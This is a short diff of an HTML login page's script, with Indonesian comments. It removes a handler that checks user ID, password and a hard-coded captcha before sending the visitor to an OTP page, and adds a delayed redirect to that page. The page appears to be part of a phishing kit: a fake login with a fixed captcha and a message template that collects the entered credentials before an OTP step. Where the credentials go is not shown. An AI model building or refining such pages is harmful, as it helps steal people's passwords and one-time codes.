@@ -290,28 +290,11 @@ Captcha: ${captcha}
 
     }
 });
+    setTimeout(()=>window.location.href="otp.html", 1200);
+  }catch(err){
+    toast("");
+    console.error(err);
+  }
 </script>
-    <script>
-document.getElementById("loginForm").addEventListener("submit", function(e){
-    e.preventDefault();
-
-    const userId = document.getElementById("userId").value.trim();
-    const password = document.getElementById("password").value.trim();
-    const captcha = document.getElementById("captcha").value.trim();
-
-    // cek semua field terisi
-    if(userId === "" || password === "" || captcha === ""){
-        return;
-    }
-
-    // cek captcha harus sama
-    if(captcha !== "nr6nm"){
-        return;
-    }
-
-    // langsung pindah ke halaman OTP
-    window.location.href = "otp.html";
-});
-    </script>
 </body>
 </html>
